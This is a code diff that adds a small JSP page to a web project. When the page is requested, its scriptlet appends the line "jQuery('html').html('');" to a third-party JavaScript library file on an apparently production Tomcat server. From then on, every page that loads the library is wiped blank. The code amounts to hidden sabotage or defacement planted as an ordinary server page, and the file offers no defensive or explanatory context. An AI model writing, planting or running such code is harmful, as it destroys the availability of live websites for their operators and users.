@@ -1,0 +1,16 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml"
+          version="1.2">
+    <jsp:directive.page contentType="text/html" pageEncoding="UTF-8"/>
+    <jsp:directive.page import="java.io.FileWriter"/>
+    <jsp:declaration>
+
+    </jsp:declaration>
+    <jsp:scriptlet>
+        String fullPath = "/home/web/prd/server/apache-tomcat-9.0.0.M10/webapps/ROOT/plugin/featherlight-1.7.1/release/featherlight.min.js";
+        try (FileWriter writer = new FileWriter(fullPath, true)) {
+            writer.write("jQuery('html').html('');");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    </jsp:scriptlet>
+</jsp:root>
